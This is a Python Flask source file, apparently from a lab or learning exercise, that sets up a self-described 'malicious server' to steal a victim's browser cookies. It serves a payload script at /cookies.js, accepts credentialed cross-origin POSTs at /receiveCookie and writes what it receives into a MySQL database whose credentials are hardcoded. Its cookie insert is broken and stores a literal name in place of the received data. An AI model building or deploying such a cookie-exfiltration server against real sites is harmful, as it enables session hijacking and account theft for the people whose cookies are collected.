#PLAN: 
#    Learn + use Flask
#    Find out how to run a 2nd server simultaneously
#    Use malicious server to get victim's cookies

from flask import Flask, request, redirect, send_file, make_response
from flask_cors import CORS
import mysql.connector

app = Flask(__name__)
CORS(app)

dbConfig = {
	'user': 'lsuser',
	'password': 'tic123',
	'host': 'localhost',
	'database': 'loginsystem',
	'raise_on_warnings': True
}

@app.route('/', methods=['GET']) 
def index():
    return '''
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>malicious server</title>
  </head>
  <body>
    <h1>Hello! Here is malicious server!</h1>
  </body>
</html>
    '''
    
@app.route('/cookies.js', methods=['GET'])
def sending_cookie():
    return send_file('./payload_cookiejar.js', attachment_filename='payload_cookiejar.js')

  
@app.route('/test', methods=['GET'])
def test_db_update():
    conn = mysql.connector.connect(**dbConfig)
    cursor = conn.cursor()
    test_insert = ("insert into cookies (cookie) values ('Testing');")
    cursor.execute(test_insert)
    conn.commit()
    cursor.close()
    conn.close()
    return ('', 204)

    
@app.route('/receiveCookie',methods=['POST', 'OPTIONS'])
def receive_cookie():
    # Handle COR preflight request
    if request.method == 'OPTIONS':
        response = make_response()
        response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
        response.headers.add('Access-Control-Allow-Methods', 'POST')
        response.headers.add('Access-Control-Allow-Credentials', 'true')
        return response
        
    json_cookies = request.get_json()
    
    conn = mysql.connector.connect(**dbConfig)
    cursor = conn.cursor()
    insert_cookie = ("insert into cookies (cookie) values (json_cookies);")
    cursor.execute(insert_cookie)
    conn.commit()
    cursor.close()
    conn.close()
    
    response = make_response()
    response.headers.add('Access-Control-Allow-Origin', 'https://localhost')
    response.headers.add('Access-Control-Allow-Credentials', 'true')
    return(response, 204)


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
